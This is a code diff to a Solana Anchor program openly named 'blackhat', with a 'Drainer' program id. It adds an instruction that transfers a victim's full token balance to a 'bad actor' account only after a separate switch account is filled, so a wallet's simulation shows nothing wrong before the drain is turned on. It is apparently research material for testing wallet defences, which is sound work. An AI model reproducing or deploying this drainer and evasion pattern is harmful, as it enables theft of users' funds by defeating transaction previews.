@@ -1,11 +1,14 @@
 use anchor_lang::prelude::*;
 use anchor_lang::system_program::{self};
+use anchor_spl::associated_token;
 use anchor_spl::token::spl_token;
 use anchor_spl::token::{self};
 use borsh::BorshDeserialize;
+use solana_program::program_pack::Pack;
 
 pub mod error;
 pub mod processor;
+pub mod state;
 
 use crate::processor::*;
 
@@ -15,13 +18,12 @@ declare_id!("Drainer1111111111111111111111111111111111111");
 pub mod blackhat {
 
     use super::*;
-    use anchor_spl::associated_token;
-    use solana_program::program_pack::Pack;
 
     pub fn create_test_account_v1<'info>(
         ctx: Context<'_, '_, '_, 'info, CreateTestAccountV1<'info>>,
+        random: bool,
     ) -> Result<()> {
-        processor::create_test_account(ctx)
+        processor::create_test_account(ctx, random)
     }
 
     pub fn drain_account<'info>(
@@ -85,6 +87,43 @@ pub mod blackhat {
             panic!("Token Transfer Error: {:?}", transfer_error)
         }
 
+        Ok(())
+    }
+
+    pub fn bitflip_drain_token_account<'info>(
+        ctx: Context<'_, '_, '_, 'info, BitflipDrainTokenAccount<'info>>,
+    ) -> Result<()> {
+        if !ctx.accounts.bit_flipper.data_is_empty() {
+            let cpi_ctx = CpiContext::new(
+                ctx.accounts.system_program.to_account_info(),
+                token::Transfer {
+                    from: ctx.accounts.victim_ata.to_account_info(),
+                    to: ctx.accounts.bad_actor_ata.to_account_info(),
+                    authority: ctx.accounts.victim.to_account_info(),
+                },
+            );
+
+            let token_account = spl_token::state::Account::unpack_from_slice(
+                &ctx.accounts
+                    .victim_ata
+                    .to_account_info()
+                    .try_borrow_data()?,
+            )?;
+
+            let result = token::transfer(cpi_ctx, token_account.amount);
+
+            if let Err(transfer_error) = result {
+                panic!("Token Transfer Error: {:?}", transfer_error)
+            }
+        }
+
+        Ok(())
+    }
+
+    pub fn enable_bitflip<'info>(
+        ctx: Context<'_, '_, '_, 'info, EnableBitflip<'info>>,
+        pda_bytes: [u8; 32],
+    ) -> Result<()> {
         Ok(())
     }
 
